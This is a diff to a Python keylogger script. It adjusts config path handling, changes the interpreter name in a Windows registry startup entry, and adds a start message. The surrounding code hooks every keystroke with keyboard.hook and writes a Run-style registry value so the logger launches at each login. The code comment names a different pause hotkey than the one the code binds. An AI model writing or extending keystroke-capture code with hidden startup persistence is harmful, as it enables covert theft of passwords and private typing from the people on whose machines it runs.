@@ -32,8 +32,9 @@ paused = False
 
 # Read confgi from json file
 def read_config():
-    if exists(CONFIG_FILE) and not os.stat(CONFIG_FILE).st_size == 0:
-        with open(CONFIG_FILE, "r") as read_file:
+    config_path = join(dir_path, CONFIG_FILE)
+    if exists(config_path) and not os.stat(config_path).st_size == 0:
+        with open(config_path, "r") as read_file:
             global config
             config = json.load(read_file)
             return True
@@ -58,7 +59,7 @@ def add_to_startup():
 
     key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
 
-    reg_value_prefix = 'CMD /k "cd ' + dir_path + ' && ' + 'python' + ' '
+    reg_value_prefix = 'CMD /k "cd ' + dir_path + ' && ' + 'py' + ' '
     reg_value_postfix = '"'
 
     reg_value = reg_value_prefix + '"' + current_file_path + reg_value_postfix
@@ -145,6 +146,7 @@ def pause_logging():
     paused = not paused
 
 def main():
+    print(LOGGER_NAME + " started")
     keyboard.hook(key_callback)
     # To Pause the Keylogger (ctrl + shift + e)
     keyboard.add_hotkey('ctrl+shift+p', pause_logging)
